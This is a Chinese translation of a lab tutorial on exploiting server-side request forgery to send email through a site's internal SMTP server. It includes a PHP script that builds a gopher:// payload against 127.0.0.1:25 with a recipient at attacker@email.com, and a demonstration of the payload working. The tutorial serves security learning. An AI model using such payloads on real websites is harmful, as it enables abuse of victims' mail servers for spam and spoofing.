<html>
<head>
<title>Server-Side Request Forgery to Internal SMTP Access</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">服务器端请求伪造内部SMTP访问</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2?source=collection_archive---------1-----------------------#2022-02-05">https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2?source=collection_archive---------1-----------------------#2022-02-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="f6f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">关于SSRF攻击的介绍可以在分离媒体上阅读<a class="ae kl" rel="noopener ugc nofollow" target="_blank" href="/exploiting-server-side-request-forgery-ssrf-vulnerability-faeb7ddf5d0e">初学者指南利用服务器端请求伪造(SSRF)漏洞</a></p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><p id="cae6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">SSRF可用于与SMTP交互，因此攻击者可以通过SMTP服务器从易受SSRF攻击的网站发送电子邮件。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="ab gu cl ky"><img src="../Images/9b43f017aa473fd419175b2816b4db44.png" data-original-src="https://miro.medium.com/v2/0*FQaEALvVt9z6aPhB"/></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">SSRF攻击</figcaption></figure><h1 id="da17" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">实验室设置</h1><pre class="kt ku kv kw gt md me mf mg aw mh bi"><span id="1320" class="mi lg iq me b gy mj mk l ml mm">git clone <a class="ae kl" href="https://github.com/rhamaa/Web-Hacking-Lab.git" rel="noopener ugc nofollow" target="_blank">https://github.com/rhamaa/Web-Hacking-Lab.git</a><br/>cd Web-Hacking-Lab/SSRF_SMTP_LAB<br/>docker build -t ssrf_smtp_lab .<br/>docker run -d --rm -p 8022:80 ssrf_smtp_lab​</span></pre><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/c287b533bdb32036a6e373dd0de2eb65.png" data-original-src="https://miro.medium.com/v2/resize:fit:980/0*2SJBPpXzTolDxu2X"/></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">索引页</figcaption></figure><ul class=""><li id="974c" class="mo mp iq jp b jq jr ju jv jy mq kc mr kg ms kk mt mu mv mw bi translated">HTTP端口被有意转发到8022，因为主机服务器端口80已经有一个服务在运行。</li></ul><blockquote class="mx"><p id="05fd" class="my mz iq bd na nb nc nd ne nf ng kk dk translated">该实验室仅使用默认的sendmail设置，可能无法向某些电子邮件提供商(如g Mail)发送(外发邮件)消息。</p></blockquote></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="c036" class="lf lg iq bd lh li nh lk ll lm ni lo lp lq nj ls lt lu nk lw lx ly nl ma mb mc bi translated">SMTP(简单邮件传输协议)101</h1><p id="69bf" class="pw-post-body-paragraph jn jo iq jp b jq nm js jt ju nn jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">SMTP是将邮件从发件人的SMTP服务器发送到邮件收件人的SMTP服务器的网络协议，默认情况下SMTP端口为25，除此之外SMTP还有另一个端口587 MSA(邮件提交代理)，端口25的区别在于端口587需要SMTP <em class="nr">认证</em>。端口587更常用，因为它被认为比端口25更安全。</p><h2 id="e143" class="mi lg iq bd lh ns nt dn ll nu nv dp lp jy nw nx lt kc ny nz lx kg oa ob mb oc bi translated">基本SMTP命令</h2><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="oe of di og bf oh"><div class="gh gi od"><img src="../Images/1ee851678042f52965959e28e2c2d6f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Nyaod0KfPqpjLWbyVfhKKw.png"/></div></div></figure><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/9cb231ac44a7bd8b140ce3b9cbb126bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/0*j5YJxUGKtqkfZXEr"/></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">使用SMTP命令的示例</figcaption></figure><blockquote class="oj ok ol"><p id="499f" class="jn jo nr jp b jq jr js jt ju jv jw jx om jz ka kb on kd ke kf oo kh ki kj kk ij bi translated"><strong class="jp ir">琐事:</strong>RCPT TO、VRFY和EXPN命令可用于执行用户名枚举，这在进行pentesting时非常有用。</p></blockquote><h1 id="0973" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">SMTP讨厌HTTP</h1><p id="c9dc" class="pw-post-body-paragraph jn jo iq jp b jq nm js jt ju nn jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">正如Orange Tsai在<em class="nr">Black Hat Asia 2019——SSRF的新时代——利用趋势编程语言</em>中的URL解析器 <em class="nr">的演讲中所说的那样，“<em class="nr"> SMTP讨厌HTTP </em>”，因为由于SMTP服务器本身的限制，HTTP无法偷偷进入SMTP。</em></p><p id="a88a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<code class="fe op oq or me b">sendmail</code>中有一个changelog，它说如果包以<em class="nr"> GET </em>、<em class="nr"> POST </em>、<em class="nr"> CONNECT </em>或<em class="nr"> USER </em>开始，它将拒绝。</p><pre class="kt ku kv kw gt md me mf mg aw mh bi"><span id="6201" class="mi lg iq me b gy mj mk l ml mm">8.14.0/8.14.0   2007/01/31  <br/>  ....<br/>  Try to deal with open HTTP proxies that are used to send spam<br/>    by recognizing some commands from them. If the first command<br/>    from the client is GET, POST, CONNECT, or USER, then the<br/>    connection is terminated immediately.</span></pre><p id="f7e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将HTTP偷偷带到SMTP是绝对不可能的，因为它肯定会被拒绝，但可以使用<em class="nr"> Gopher </em>和HTTPS协议来偷偷带到SMTP协议，这样就可以解决这个问题。</p><blockquote class="oj ok ol"><p id="7c66" class="jn jo nr jp b jq jr js jt ju jv jw jx om jz ka kb on kd ke kf oo kh ki kj kk ij bi translated">琐事:HTTPS不支持像gopher这样的多行请求，因此如果你想通过HTTPS查询SMTP，需要一个CRLF注入漏洞。</p></blockquote><h1 id="3415" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">通过Gopher进行SMTP查询</h1><p id="23b5" class="pw-post-body-paragraph jn jo iq jp b jq nm js jt ju nn jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">SMTP查询的Gopher语法如下。</p><p id="b744" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe op oq or me b">gopher://&lt;Intranet_IP&gt;:25/_&lt;Command_SMTP&gt;</code></p><p id="17b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面的脚本可以用来自动生成有效负载。</p><pre class="kt ku kv kw gt md me mf mg aw mh bi"><span id="08dd" class="mi lg iq me b gy mj mk l ml mm">&lt;?php<br/>        $commands = array(<br/>                'HELO target.0xff.web.id',<br/>                'MAIL FROM: &lt;<a class="ae kl" href="mailto:root@target.0xff.web.id" rel="noopener ugc nofollow" target="_blank">root@target.0xff.web.id</a>&gt;',<br/>                'RCPT TO: &lt;<a class="ae kl" href="mailto:attacker@email.com" rel="noopener ugc nofollow" target="_blank">attacker@email.com</a>&gt;',<br/>                'DATA',<br/>                'Subject: SSRF HERE',<br/>                'SSRF AND SMTP',<br/>                '.'<br/>        );</span><span id="da88" class="mi lg iq me b gy os mk l ml mm">$payload = implode('%0A', $commands); // memisahkan tiap command dengan newline</span><span id="4f12" class="mi lg iq me b gy os mk l ml mm">echo 'gopher://127.0.0.1:25/_' . $payload;<br/>?&gt;</span></pre><blockquote class="oj ok ol"><p id="15e2" class="jn jo nr jp b jq jr js jt ju jv jw jx om jz ka kb on kd ke kf oo kh ki kj kk ij bi translated">在&lt;端口&gt;之后的_ ( <strong class="jp ir">下划线</strong>):/表示<strong class="jp ir"> gophertype </strong>，所以必须包含它，因为如果不包含该字符，有效载荷将被截断1个字符，例如有效载荷是HelloWorld，如果不包含_符号，有效载荷将变成elloWorld..</p></blockquote><h1 id="3cc5" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">攻击演示</h1><p id="c332" class="pw-post-body-paragraph jn jo iq jp b jq nm js jt ju nn jw jx jy no ka kb kc np ke kf kg nq ki kj kk ij bi translated">生成地鼠负载</p><pre class="kt ku kv kw gt md me mf mg aw mh bi"><span id="7029" class="mi lg iq me b gy mj mk l ml mm">$ php payload.php<br/>gopher://127.0.0.1:25/_HELO target.0xff.web.id%0AMAIL FROM: &lt;<a class="ae kl" href="mailto:root@target.0xff.web.id" rel="noopener ugc nofollow" target="_blank">root@target.0xff.web.id</a>&gt;%0ARCPT TO: &lt;<a class="ae kl" href="mailto:attacker@email.com" rel="noopener ugc nofollow" target="_blank">attacker@email.com</a>&gt;%0ADATA%0ASubject: SSRF HERE%0ASSRF AND SMTP%0A.</span></pre><p id="df78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输入已经生成到目标网站的有效负载。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/5bd6e236233cf3f65dddff9da887717e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/0*t_DZpkmzkZMIGchV"/></div></figure><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="oe of di og bf oh"><div class="gh gi ou"><img src="../Images/751572515c6bec1122f3a90879296543.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/0*FFmH6_cbLj83bna3"/></div></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">提交有效负载后的响应</figcaption></figure><p id="dfe9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一封来自目标服务器的邮件。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="oe of di og bf oh"><div class="gh gi ov"><img src="../Images/d9c16e3e9f650f8005e30924f7337857.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*sCvmWpHQRbnp2MHD"/></div></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">电子邮件Masuk</figcaption></figure><h1 id="d758" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">参考</h1><ul class=""><li id="a547" class="mo mp iq jp b jq nm ju nn jy ow kc ox kg oy kk mt mu mv mw bi translated"><a class="ae kl" href="http://blog.smartreach.io/2018/11/21/smtp-pop3-imap-work/" rel="noopener ugc nofollow" target="_blank">http://blog.smartreach.io/2018/11/21/smtp-pop3-imap-work/</a></li><li id="eacd" class="mo mp iq jp b jq oz ju pa jy pb kc pc kg pd kk mt mu mv mw bi translated">【https://hackerone.com/reports/115748 T2】号</li><li id="ad8c" class="mo mp iq jp b jq oz ju pa jy pb kc pc kg pd kk mt mu mv mw bi translated">【https://tools.ietf.org/html/rfc4266 T4】</li><li id="dfe2" class="mo mp iq jp b jq oz ju pa jy pb kc pc kg pd kk mt mu mv mw bi translated"><a class="ae kl" href="https://serverfault.com/questions/776489/what-exactly-does-probable-open-proxy-command-post-mean-in-sendmail-logs" rel="noopener ugc nofollow" target="_blank">https://server fault . com/questions/776489/what-exact-do-probable-open-proxy-command-post-mean-in-sendmail-logs</a></li><li id="b68c" class="mo mp iq jp b jq oz ju pa jy pb kc pc kg pd kk mt mu mv mw bi translated">SSRF的新时代——在流行的编程语言中开发URL解析器！</li></ul></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="091e" class="lf lg iq bd lh li nh lk ll lm ni lo lp lq nj ls lt lu nk lw lx ly nl ma mb mc bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae kl" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="pe pf gp gr pg ph"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="pi ab fo"><div class="pj ab pk cl cj pl"><h2 class="bd ir gy z fp pm fr fs pn fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="po l"><h3 class="bd b gy z fp pm fr fs pn fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="pp l"><p class="bd b dl z fp pm fr fs pn fu fw dk translated">iwcon.live</p></div></div><div class="pq l"><div class="pr l ps pt pu pq pv kz ph"/></div></div></a></div></div></div>    
</body>
</html>